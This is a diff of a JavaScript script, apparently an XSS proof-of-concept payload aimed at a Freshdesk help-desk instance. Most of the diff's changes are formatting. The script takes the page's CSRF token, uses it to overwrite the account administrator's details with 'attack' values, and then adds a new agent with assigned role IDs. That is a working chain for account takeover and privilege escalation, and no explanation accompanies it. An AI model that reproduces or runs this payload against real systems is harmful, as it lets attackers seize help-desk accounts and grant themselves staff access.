@@ -5,6 +5,8 @@ async function getCsrfToken() {
     const doc = parser.parseFromString(text, 'text/html');
     const meta = doc.querySelector('meta[name="csrf-token"]');
     return meta ? meta.getAttribute('content') : null;
+}
+
 async function updateAccountAdmin(csrfToken) {
     const url = 'https://usnavneel.freshdesk.com/api/_/account_admin';
     const data = {
@@ -12,7 +14,8 @@ async function updateAccountAdmin(csrfToken) {
         last_name: "attack",
         phone: 1111111111,
         company_name: "Navneel xss company"
-};
+    };
+
     const response = await fetch(url, {
         method: 'PUT',
         headers: {
@@ -20,11 +23,13 @@ async function updateAccountAdmin(csrfToken) {
             'Content-Type': 'application/json; charset=utf-8',
             'X-Csrf-Token': csrfToken,
             'X-Requested-With': 'XMLHttpRequest'
-},
+        },
         body: JSON.stringify(data)
     });
+
     return response.json();
 }
+
 async function addAgent(csrfToken) {
     const url = 'https://usnavneel.freshdesk.com/api/_/agents';
     const data = {
@@ -39,7 +44,8 @@ async function addAgent(csrfToken) {
         role_ids: [154000059877, 154000059876],
         occasional: false,
         signature: ""
-};
+    };
+
     const response = await fetch(url, {
         method: 'POST',
         headers: {
@@ -47,20 +53,26 @@ async function addAgent(csrfToken) {
             'Content-Type': 'application/json; charset=utf-8',
             'X-Csrf-Token': csrfToken,
             'X-Requested-With': 'XMLHttpRequest'
-},
+        },
         body: JSON.stringify(data)
     });
+
     return response.json();
 }
+
 async function processRequests() {
     const csrfToken = await getCsrfToken();
+
     if (!csrfToken) {
         console.error('Failed to retrieve CSRF token.');
         return;
-}
+    }
+
     const updateResponse = await updateAccountAdmin(csrfToken);
     console.log("Update Response:", updateResponse);
+
     const addAgentResponse = await addAgent(csrfToken);
     console.log("Add Agent Response:", addAgentResponse);
 }
+
 processRequests();
